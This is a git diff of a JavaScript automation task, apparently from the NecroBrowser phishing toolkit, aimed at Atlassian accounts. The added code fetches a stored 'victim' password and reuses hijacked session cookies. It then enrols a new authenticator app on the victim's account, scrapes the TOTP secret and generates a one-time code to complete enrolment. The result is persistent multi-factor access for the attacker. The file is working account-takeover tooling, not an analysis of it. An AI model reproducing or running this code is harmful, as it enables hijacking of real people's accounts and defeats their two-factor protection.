@@ -58,6 +58,8 @@ exports.GetProfileInfo = async ({ page, data: [taskId, cookies, params] }) => {
     await page.click("a:nth-child(1) > button:nth-child(1)").catch(console.error);
     await page.waitForTimeout(5000);
     await page.screenshot({ fullPage: true, path: "/home/natalinux/Documents/necrobrowser/tasks/atlassian/debugging-outputs/Profile_page.jpg" }).catch(console.error);
+    await page.close();
+
     await db.UpdateTaskStatus(taskId, "completed");
 
 
@@ -99,14 +101,11 @@ exports.GetAccountSettingsScreenshots = async ({ browser, page, data: [taskId, c
 
 }
 
-exports.AddAuthenticatorApp = async ({  page, data: [taskId, cookies, params] }) => {
+exports.AddAuthenticatorApp = async ({ page, data: [taskId, cookies, params] }) => {
 
     console.log(`The page is [${page}] the data contains taskID ${taskId}, cookies ${cookies}, params ${params}`);
-    console.log(params);
     let res = await db.GetCredentials(`victim:${params.trackers}`);
-    console.log(res);
-    let pwd = (res.find(e=>e.key=='Password')).val;
-    console.log(pwd);
+    let pwd = (res.find(e => e.key == 'Password')).val;
 
     //qua stiamo editanto cookies per riferimento quindi sto controllo e' inutile scritto cosi'
     let nc = necrolib.PropagateCookies(cookies);
@@ -115,14 +114,45 @@ exports.AddAuthenticatorApp = async ({  page, data: [taskId, cookies, params] })
     await page.goto(params.urls[0]);
     await page.waitForTimeout(5000);
     // type the password in the input field
-    const input = 'input';
-    await page.click(input).catch(console.error);
+    const inputPassword = 'input';
+    // click and type the password
+    await page.click(inputPassword).catch(console.error);
 
-    await page.type(input, pwd, { delay: 300 }).catch(console.error)
+    await page.type(inputPassword, pwd, { delay: 300 }).catch(console.error)
 
     await page.waitForTimeout(5000);
+    // submit the password
     await page.keyboard.press('Enter');
     await page.waitForTimeout(5000);
+    // click on "Yes, ready to scan the code"
+    await page.click('button[id="mfa.enrollment.getapp.submit"]').catch(console.error);
+    await page.waitForTimeout(5000);
+    //click on "Can't scan the code?"
+    await page.click('div[id="mfa.enrollment.configureapp.totpsecret"] > div > button').catch(console.error);
+    await page.waitForTimeout(5000);
+
+    // retrieve the account name and the OTP secretkey
+    let accountName = await page.$eval('input[id="mfa.enrollment.configureapp.email"]', ({ value }) => value);
+    let secretKey = await page.$eval('input[id="mfa.enrollment.configureapp.secret"]', ({ value }) => value);
+
+    // get the OTP from the secretKey using totp-generator
+    const totp = await necrohelp.Totp(secretKey)
+    console.log(`[${taskId}] Generated OTP from secretKey ${secretKey}: ${totp}`)
+
+    // type the OTP in the input field
+    const inputOtp = 'input[name="otpCode"]';
+
+    // click and type the OTP
+    await page.click(inputOtp).catch(console.error);
+
+    await page.type(inputOtp, totp, { delay: 300 }).catch(console.error)
+
+    await page.waitForTimeout(2000)
+
+    // click on Next
+    await page.click('button[id="mfa.enrollment.connectphone.submit"]').catch(console.error)
+    await page.waitForTimeout(5000)
+
 
     await page.screenshot({ fullPage: true, path: "/home/natalinux/Documents/necrobrowser/tasks/atlassian/debugging-outputs/2fa.jpg" }).catch(console.error);
     await db.UpdateTaskStatus(taskId, "completed");
